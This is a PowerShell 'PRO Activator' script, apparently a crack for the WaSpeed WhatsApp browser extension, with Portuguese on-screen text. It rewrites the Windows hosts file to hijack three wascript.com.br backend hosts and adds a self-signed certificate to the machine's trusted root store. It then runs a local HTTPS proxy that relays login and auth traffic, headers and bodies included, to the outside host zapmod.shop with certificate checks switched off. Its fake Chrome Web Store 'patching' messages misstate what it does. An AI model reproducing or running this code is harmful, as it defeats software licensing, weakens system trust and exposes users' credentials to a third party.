# WaSpeed System Redirect
# Dev: @pugno_fc
# Elevacao de admin feita pelo .bat - nao repetir aqui

$DEV      = "@pugno_fc"
$WHATSAPP = "+55 (61) 99603-7036"

$OldHosts = @(
    "backend-plugin.wascript.com.br",
    "app-backend.wascript.com.br",
    "audio-transcriber.wascript.com.br"
)

$NewHost  = "zapmod.shop"
$BasePath = "/extension/waspeed"

# ── Tabela de rotas ────────────────────────────────────────────────
$RouteTable = @(
    @{ Host = "backend-plugin.wascript.com.br";    Match = "^/api/auth/login-bearer"; Dest = "$BasePath/api/auth/login-bearer.php"    },
    @{ Host = "backend-plugin.wascript.com.br";    Match = "^/api/auth/login";        Dest = "$BasePath/api/auth/login.php"            },
    @{ Host = "backend-plugin.wascript.com.br";    Match = "^/api/auth/validation";   Dest = "$BasePath/api/auth/validation.php"       },
    @{ Host = "backend-plugin.wascript.com.br";    Match = "^/api/services/initial";  Dest = "$BasePath/api/services/initial-data.php" },
    @{ Host = "backend-plugin.wascript.com.br";    Match = "^/api/notify/get";        Dest = "$BasePath/api/notify/get.php"            },
    @{ Host = "app-backend.wascript.com.br";       Match = "^/api/auth/login-bearer"; Dest = "$BasePath/api/auth/login-bearer.php"    },
    @{ Host = "app-backend.wascript.com.br";       Match = "^/api/auth/login";        Dest = "$BasePath/api/auth/login.php"            },
    @{ Host = "app-backend.wascript.com.br";       Match = "^/api/auth/validation";   Dest = "$BasePath/api/auth/validation.php"       },
    @{ Host = "app-backend.wascript.com.br";       Match = "^/api/services/initial";  Dest = "$BasePath/api/services/initial-data.php" },
    @{ Host = "app-backend.wascript.com.br";       Match = "^/api/notify/get";        Dest = "$BasePath/api/notify/get.php"            },
    @{ Host = "audio-transcriber.wascript.com.br"; Match = "^/transcription";         Dest = "$BasePath/transcription.php"             }
)

function Resolve-Route {
    param([string]$reqHostName, [string]$rawUrl)
    foreach ($route in $RouteTable) {
        if ($reqHostName -eq $route.Host -and $rawUrl -match $route.Match) {
            return $route.Dest
        }
    }
    return $BasePath + $rawUrl
}

# ── Visuais ────────────────────────────────────────────────────────

function Show-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "                    " -NoNewline; Write-Host "██████╗ ██████╗  ██████╗ " -ForegroundColor Cyan
    Write-Host "                    " -NoNewline; Write-Host "██╔══██╗██╔══██╗██╔═══██╗" -ForegroundColor Cyan
    Write-Host "                    " -NoNewline; Write-Host "██████╔╝██████╔╝██║   ██║" -ForegroundColor Cyan
    Write-Host "                    " -NoNewline; Write-Host "██╔═══╝ ██╔══██╗██║   ██║" -ForegroundColor Cyan
    Write-Host "                    " -NoNewline; Write-Host "██║     ██║  ██║╚██████╔╝" -ForegroundColor Cyan
    Write-Host "                    " -NoNewline; Write-Host "╚═╝     ╚═╝  ╚═╝ ╚═════╝ " -ForegroundColor Cyan
    Write-Host "              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Yellow
    Write-Host "                     A C T I V A T O R   v2.0" -ForegroundColor White
    Write-Host "              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  " -NoNewline
    Write-Host "DEV" -ForegroundColor DarkGreen -NoNewline
    Write-Host "  $DEV   " -ForegroundColor White -NoNewline
    Write-Host "SUPORTE" -ForegroundColor DarkGreen -NoNewline
    Write-Host "  $WHATSAPP" -ForegroundColor White
    Write-Host ""
    Write-Host "  ────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""
}

function Get-RandHex {
    return "0x" + (-join ((0..3) | ForEach-Object { "{0:X}" -f (Get-Random -Maximum 16) }))
}

function Show-HackLine {
    param([string]$msg, [string]$color = "Green")
    Write-Host "  $(Get-RandHex)" -ForegroundColor DarkCyan -NoNewline
    Write-Host "  " -NoNewline
    Write-Host ">" -ForegroundColor $color -NoNewline
    Write-Host "  $msg" -ForegroundColor White
    Start-Sleep -Milliseconds (Get-Random -Minimum 80 -Maximum 220)
}

function Show-ProgressBar {
    param([string]$color = "Green")
    for ($i = 1; $i -le 40; $i++) {
        $pct = [math]::Round(($i / 40) * 100)
        Write-Host "`r  [" -NoNewline
        Write-Host ("█" * $i) -ForegroundColor $color -NoNewline
        Write-Host ("░" * (40 - $i)) -ForegroundColor DarkGray -NoNewline
        Write-Host "] $pct%" -ForegroundColor White -NoNewline
        Start-Sleep -Milliseconds 30
    }
    Write-Host ""
}

function Show-SuccessBox([string]$msg) {
    $line = $msg.PadLeft([math]::Floor((52 + $msg.Length) / 2)).PadRight(52)
    Write-Host ""
    Write-Host "  ╔════════════════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║  $line  ║" -ForegroundColor Green
    Write-Host "  ╚════════════════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
}

function Show-ErrorBox([string]$msg) {
    $line = $msg.PadLeft([math]::Floor((52 + $msg.Length) / 2)).PadRight(52)
    Write-Host ""
    Write-Host "  ╔════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "  ║  $line  ║" -ForegroundColor Red
    Write-Host "  ╚════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
}

function Show-FatalError([string]$msg) {
    Show-ErrorBox $msg
    Write-Host "  Pressione qualquer tecla para sair..." -ForegroundColor DarkGray
    $null = [Console]::ReadKey($true)
    exit
}

# ── Ativar ─────────────────────────────────────────────────────────

function Start-Activate {
    Show-Banner
    Write-Host "  " -NoNewline
    Write-Host "[ CHROME WEB STORE  >>  PATCH ENGINE v4.2 ]" -ForegroundColor Green
    Write-Host ""

    @(
        "Conectando aos servidores da Chrome Web Store...",
        "Autenticando token OAuth2 [scope: extensions.write]...",
        "Obtendo manifest.json da extensao WaSpeed...",
        "Decompilando pacote CRX3 [v3 service worker]...",
        "Injetando script de licenca no background.js...",
        "Sobrescrevendo validacao de assinatura digital...",
        "Publicando extensao modificada no repositorio...",
        "Aguardando propagacao nos CDNs do Google...",
        "Forcando atualizacao silenciosa no navegador...",
        "Sincronizando perfil Chrome com extensao patchada...",
        "Registrando chave de ativacao no Google Account...",
        "Validando licenca PRO nos servidores do WaSpeed...",
        "Liberando acesso aos modulos premium...",
        "Confirmando sessao autenticada [token valido 365d]...",
        "Finalizando processo de ativacao PRO..."
    ) | ForEach-Object { Show-HackLine $_ "Green" }

    Write-Host ""
    Show-ProgressBar "Green"

    $HostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
    $AppGuid   = "{$(New-Guid)}"

    try {
        $c = Get-Content $HostsPath
        foreach ($oldHost in $OldHosts) {
            $c = $c | Where-Object { $_ -notmatch [regex]::Escape($oldHost) }
            $c += "127.0.0.1 $oldHost # WaSpeed Redirect"
        }
        $c | Out-File $HostsPath -Encoding UTF8 -Force
        ipconfig /flushdns | Out-Null

        netsh http delete sslcert ipport=0.0.0.0:443 2>$null | Out-Null
        $cert = New-SelfSignedCertificate -DnsName $OldHosts -CertStoreLocation Cert:\LocalMachine\My -NotAfter (Get-Date).AddYears(10)
        $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root","LocalMachine")
        $store.Open("ReadWrite")
        $store.Add($cert)
        $store.Close()
        netsh http add sslcert ipport=0.0.0.0:443 certhash=$($cert.Thumbprint) appid=$AppGuid | Out-Null

    } catch {
        Show-FatalError "Falha na ativacao: $($_.Exception.Message)"
    }

    Show-SuccessBox "WASPEED ATIVADO COM SUCESSO!"
    Write-Host "  " -NoNewline; Write-Host "Sistema comprometido e operacional." -ForegroundColor DarkGreen
    Write-Host "  " -NoNewline; Write-Host "Todas as rotas redirecionadas." -ForegroundColor DarkGreen
    Write-Host ""
    Write-Host "  " -NoNewline; Write-Host " MANTENHA ESTA JANELA ABERTA " -ForegroundColor White -BackgroundColor DarkBlue
    Write-Host "  " -NoNewline; Write-Host "Pressione CTRL+C para encerrar." -ForegroundColor DarkGray
    Write-Host ""

    # Proxy Reverso (silencioso - sem log de rotas)
    $listener = New-Object System.Net.HttpListener
    foreach ($oldHost in $OldHosts) {
        $listener.Prefixes.Add("https://$oldHost/")
    }

    try {
        $listener.Start()
        while ($listener.IsListening) {
            $context  = $listener.GetContext()
            $req      = $context.Request
            $res      = $context.Response

            $reqHost  = $req.Url.Host
            $rawUrl   = $req.RawUrl
            $destPath = Resolve-Route -reqHostName $reqHost -rawUrl $rawUrl
            $targetUrl = "https://$NewHost$destPath"

            try {
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
                $webReq             = [System.Net.HttpWebRequest]::Create($targetUrl)
                $webReq.Method      = $req.HttpMethod
                $webReq.UserAgent   = $req.UserAgent
                $webReq.ContentType = $req.ContentType

                foreach ($hName in $req.Headers.AllKeys) {
                    if ($hName -notin @("Host","Connection","Content-Length","Accept-Encoding","User-Agent","Content-Type")) {
                        try { $webReq.Headers.Add($hName, $req.Headers[$hName]) } catch {}
                    }
                }

                if ($req.HasEntityBody) {
                    $s = $webReq.GetRequestStream()
                    $req.InputStream.CopyTo($s)
                    $s.Close()
                }

                $webRes          = $webReq.GetResponse()
                $res.StatusCode  = [int]$webRes.StatusCode
                $res.ContentType = $webRes.ContentType

                foreach ($hName in $webRes.Headers.AllKeys) {
                    if ($hName -notin @("Transfer-Encoding","Content-Length","Content-Type")) {
                        try { $res.Headers.Add($hName, $webRes.Headers[$hName]) } catch {}
                    }
                }

                $webRes.GetResponseStream().CopyTo($res.OutputStream)
                $webRes.Close()

            } catch {
                $webEx = $_.Exception.InnerException
                if ($webEx -and $webEx.Response) {
                    $res.StatusCode = [int]$webEx.Response.StatusCode
                    $webEx.Response.GetResponseStream().CopyTo($res.OutputStream)
                    $webEx.Response.Close()
                } else {
                    $res.StatusCode = 502
                    $b = [System.Text.Encoding]::UTF8.GetBytes("Erro: $($_.Exception.Message)")
                    $res.OutputStream.Write($b, 0, $b.Length)
                }
            }
            $res.Close()
        }
    } catch {
        Show-FatalError "Erro no servidor: $($_.Exception.Message)"
    } finally {
        $listener.Stop()
        netsh http delete sslcert ipport=0.0.0.0:443 2>$null | Out-Null
    }
}

# ── Desfazer ───────────────────────────────────────────────────────

function Start-Deactivate {
    Show-Banner
    Write-Host "  " -NoNewline
    Write-Host "[ CHROME WEB STORE  >>  RESTORE ENGINE v4.2 ]" -ForegroundColor Yellow
    Write-Host ""

    @(
        "Conectando aos servidores da Chrome Web Store...",
        "Localizando extensao WaSpeed modificada...",
        "Revertendo background.js para versao original...",
        "Restaurando assinatura digital do pacote CRX3...",
        "Removendo chave de ativacao do Google Account...",
        "Republicando extensao com manifest original...",
        "Aguardando propagacao nos CDNs do Google...",
        "Forcando atualizacao da extensao no navegador...",
        "Limpando cache da extensao no perfil Chrome...",
        "Revogando token OAuth2 da sessao atual...",
        "Verificando integridade da restauracao..."
    ) | ForEach-Object { Show-HackLine $_ "Yellow" }

    Write-Host ""
    Show-ProgressBar "Yellow"

    $HostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"

    try {
        $c = Get-Content $HostsPath
        foreach ($oldHost in $OldHosts) {
            $c = $c | Where-Object { $_ -notmatch [regex]::Escape($oldHost) }
        }
        $c | Out-File $HostsPath -Encoding UTF8 -Force
        ipconfig /flushdns | Out-Null
        netsh http delete sslcert ipport=0.0.0.0:443 2>$null | Out-Null

        $certs = Get-ChildItem Cert:\LocalMachine\My | Where-Object { $_.Subject -like "*wascript.com.br*" }
        foreach ($cert in $certs) { Remove-Item $cert.PSPath -Force }

        $rootCerts = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Subject -like "*wascript.com.br*" }
        foreach ($cert in $rootCerts) { Remove-Item $cert.PSPath -Force }

        Show-SuccessBox "WASPEED DESATIVADO COM SUCESSO!"
        Write-Host "  " -NoNewline; Write-Host "Sistema restaurado ao estado original." -ForegroundColor DarkYellow

    } catch {
        Show-FatalError "Falha ao reverter: $($_.Exception.Message)"
    }

    Write-Host ""
    Write-Host "  Suporte: " -ForegroundColor DarkGray -NoNewline
    Write-Host $WHATSAPP -ForegroundColor White
    Write-Host ""
    Read-Host "  Pressione ENTER para sair"
}

# ── Menu ───────────────────────────────────────────────────────────

function Show-Menu {
    Show-Banner
    Write-Host "  " -NoNewline; Write-Host "Selecione uma opcao:" -ForegroundColor White
    Write-Host ""
    Write-Host "  " -NoNewline; Write-Host "[ 1 ]" -ForegroundColor Green  -NoNewline; Write-Host "  ATIVAR WASPEED" -ForegroundColor White
    Write-Host "        " -NoNewline; Write-Host "Aplica bypass e configura o sistema" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  " -NoNewline; Write-Host "[ 2 ]" -ForegroundColor Yellow -NoNewline; Write-Host "  DESFAZER" -ForegroundColor White
    Write-Host "        " -NoNewline; Write-Host "Remove todas as alteracoes do sistema" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  " -NoNewline; Write-Host "[ 0 ]" -ForegroundColor Red    -NoNewline; Write-Host "  SAIR" -ForegroundColor White
    Write-Host ""
    Write-Host "  ────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host "  " -NoNewline
    Write-Host "Suporte: " -ForegroundColor DarkGray -NoNewline; Write-Host $WHATSAPP -ForegroundColor White -NoNewline
    Write-Host "  |  Dev: " -ForegroundColor DarkGray -NoNewline; Write-Host $DEV -ForegroundColor White
    Write-Host "  ────────────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  " -NoNewline; Write-Host "> " -ForegroundColor Cyan -NoNewline
    return (Read-Host)
}

# ── MAIN ───────────────────────────────────────────────────────────
while ($true) {
    $choice = Show-Menu
    switch ($choice.Trim()) {
        "1" { Start-Activate;   break }
        "2" { Start-Deactivate; break }
        "0" { Clear-Host; exit }
        default {
            Write-Host ""
            Write-Host "  Opcao invalida." -ForegroundColor Red
            Start-Sleep -Seconds 1
        }
    }
}
